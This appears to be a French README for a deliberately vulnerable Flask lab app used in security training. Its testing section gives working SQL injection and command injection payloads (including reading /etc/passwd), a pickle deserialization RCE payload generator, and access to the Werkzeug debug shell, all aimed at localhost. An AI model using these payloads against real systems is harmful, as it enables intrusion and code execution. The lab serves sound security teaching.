# 🚀 Guide d'Installation & Démarrage Rapide

## 📋 Prérequis

- **Python 3.8+**
- **pip** ou **poetry**
- **Git**
- (Optionnel) **Docker & Docker Compose**

---

## 📥 Installation

### Option 1 : Installation Locale

```bash
# Cloner le repository
git clone https://github.com/username/security-vulnerabilities.git
cd security-vulnerabilities

# Créer un environnement virtuel
python3 -m venv venv
source venv/bin/activate  # Sur Windows: venv\Scripts\activate

# Installer les dépendances
pip install -r requirements.txt
```

### Option 2 : Avec Docker

```bash
# Construire l'image
docker build -t security-vuln .

# Lancer le container
docker run -p 5000:5000 security-vuln

# Ou avec Docker Compose
docker-compose up
```

---

## 🎯 Utilisation

### Démarrer l'Application

```bash
# Activation de l'environnement virtuel (si pas fait)
source venv/bin/activate

# Lancer l'app
python main.py
```

L'application démarre sur `http://localhost:5000`

---

## 🧪 Tester les Vulnérabilités

### 1️⃣ SQL Injection

```bash
# Requête normale
curl "http://localhost:5000/vulnerable-action?data=1"

# SQL Injection - Bypass
curl "http://localhost:5000/vulnerable-action?data=' OR '1'='1"

# SQL Injection - Extraction de données
curl "http://localhost:5000/vulnerable-action?data=' UNION SELECT * FROM admin--"
```

---

### 2️⃣ Injection de Commande

```bash
# Requête normale
curl "http://localhost:5000/vulnerable-action?data=hello"

# Command Injection - Lire un fichier
curl "http://localhost:5000/vulnerable-action?data=;cat%20/etc/passwd"

# Command Injection - Exécuter whoami
curl "http://localhost:5000/vulnerable-action?data=;whoami"
```

⚠️ Sur Windows, utiliser `|` au lieu de `;`

---

### 3️⃣ Désérialisation Insecure (Pickle)

Générer un payload d'exploitation :

```python
import pickle
import base64
import os

# Créer une charge utile malveillante
class RCE:
    def __reduce__(self):
        return (os.system, ('touch /tmp/pwned',))

payload = pickle.dumps(RCE())
encoded = base64.b64encode(payload).decode()
print(f"?data={encoded}")
```

Envoyer le payload :
```bash
curl "http://localhost:5000/vulnerable-action?data={PAYLOAD_ENCODÉ}"
```

---

### 4️⃣ Clés Secrètes Hardcodées

Vérifier le code source ou utiliser des outils :

```bash
# Avec grep
grep -r "SECRET_KEY\|PASSWORD" .

# Avec gitleaks
gitleaks detect --source . -v
```

---

### 5️⃣ Mode Debug

Accéder au débogueur Werkzeug :

```
http://localhost:5000/vulnerable-action?data=invalid
# Cliquer sur le bouton console pour accéder au shell interactif
```

---

## 🔍 Analyser avec des Outils de Sécurité

### Bandit (Scan Python)
```bash
pip install bandit
bandit -r . -ll
```

### Semgrep (SAST)
```bash
pip install semgrep
semgrep --config=p/security-audit .
```

### OWASP ZAP (Dynamic Scan)
```bash
# Installer : https://www.zaproxy.org/
zaproxy.sh -cmd -quickurl http://localhost:5000 -quickout report.html
```

---

## 📚 Structure du Projet

```
security-vulnerabilities/
├── main.py                      # Code vulnérable principal
├── README.md                    # Ce fichier
├── SECURITY_FIXES.md            # Solutions détaillées
├── CODE_OF_CONDUCT.md           # Politique d'utilisation
├── requirements.txt             # Dépendances Python
├── Dockerfile                   # Configuration Docker
├── docker-compose.yml           # Orchestration Docker
├── .gitignore                   # Fichiers à ignorer
├── .env.example                 # Exemple de variables d'env
├── tests/                       # Tests d'exploitation (futur)
└── docs/                        # Documentation additionnelle (futur)
```

---

## ❌ Troubleshooting

### Port 5000 déjà utilisé
```bash
# Chercher le processus
lsof -i :5000

# Ou utiliser un autre port
python main.py --port 5001
```

### Erreur : Module Flask non trouvé
```bash
# Vérifier que l'environnement virtuel est activé
which python

# Réinstaller les dépendances
pip install --upgrade -r requirements.txt
```

### Erreur : Permission denied
```bash
# Sur macOS/Linux
chmod +x main.py
python main.py
```

---

## 🎓 Ressources d'Apprentissage

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

---

**Questions ? Consultez [SECURITY_FIXES.md](SECURITY_FIXES.md) pour les solutions détaillées.**

Dernière mise à jour : January 2026
